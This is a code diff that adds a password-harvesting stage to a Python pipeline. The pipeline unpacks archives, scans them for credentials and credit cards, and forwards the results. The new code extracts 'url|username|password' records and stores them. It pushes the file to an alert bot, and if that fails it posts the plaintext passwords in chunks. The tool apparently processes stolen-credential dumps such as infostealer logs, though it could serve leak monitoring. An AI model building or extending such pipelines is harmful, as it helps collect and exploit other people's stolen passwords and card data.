@@ -22,6 +22,7 @@ from database_manager import DatabaseManager, Job
 from extractor import ArchiveProcessor
 from parse_credentials import scan_tree, write_results, extract_raw_credentials
 from parse_credit_cards import extract_credit_cards, format_credit_card_line, write_credit_cards_file
+from parse_passwords import extract_passwords, format_password_line, write_passwords_file
 from password_store import PasswordStore
 from session_store import SessionStore
 from secure_logging import configure_logging
@@ -474,6 +475,39 @@ class Pipeline:
                 'cards_count': len(cards),
                 'files_with_cards': unique_files,
                 'stage': 'credit-card-alert',
+            },
+        )
+
+    async def alert_passwords(self, job: Job, records: list[dict]) -> None:
+        """Persist + push found login passwords to the alert bot whenever configured."""
+        if not records:
+            return
+        await asyncio.to_thread(self.db.save_passwords, job.id, records)
+        passwords_file = self.s.output_dir / f'passwords-{job.message_id}.txt'
+        password_lines = [format_password_line(record) for record in records]
+        await asyncio.to_thread(write_passwords_file, records, passwords_file)
+        unique_files = len({r['file'] for r in records})
+        source = job.source_link or job.source or 'job'
+        caption = (
+            f"🔑 Passwords found\n"
+            f"Job #{job.id}\n"
+            f"Source: {source}\n"
+            f"Count: {len(records)}\n"
+            f"Files: {unique_files}"
+        )
+        sent = await self.notify_cred_bot(caption, document=passwords_file)
+        if not sent:
+            body = caption + "\n\n" + "\n".join(password_lines)
+            for start in range(0, len(body), 3500):
+                await self.notify_cred_bot(body[start:start + 3500])
+        LOG.info(
+            'Passwords extracted and alerted',
+            extra={
+                'job_id': job.id,
+                'message_id': job.message_id,
+                'passwords_count': len(records),
+                'files_with_passwords': unique_files,
+                'stage': 'password-alert',
             },
         )
 
@@ -1129,6 +1163,24 @@ class Pipeline:
                 if job.chat_id:
                     await self.notify(job.chat_id,'⚠️ No credit cards found in extracted files',job.message_id)
                 LOG.info('No credit cards found', extra={'job_id': job.id, 'message_id': job.message_id, 'stage': 'processing'})
+
+            await self.notify(job.chat_id,'🔑 Scanning for passwords…',job.message_id)
+            raw_passwords=await asyncio.to_thread(
+                extract_passwords, root, 8, self.s.output_dir, self.s.max_scan_file_bytes
+            )
+            if raw_passwords:
+                await self.alert_passwords(job, raw_passwords)
+                if job.chat_id:
+                    passwords_msg=(
+                        f"🔑 Passwords extracted (url|username|password)\n"
+                        f"📊 Total passwords found: {len(raw_passwords)}\n"
+                        f"📁 Files containing passwords: {len(set(r['file'] for r in raw_passwords))}"
+                    )
+                    await self.notify(job.chat_id, passwords_msg, job.message_id)
+            else:
+                if job.chat_id:
+                    await self.notify(job.chat_id,'⚠️ No passwords found in extracted files',job.message_id)
+                LOG.info('No passwords found', extra={'job_id': job.id, 'message_id': job.message_id, 'stage': 'processing'})
             
             # Send redacted reports (best-effort — chat bans must not fail a completed scan).
             if job.chat_id and self.client is not None:
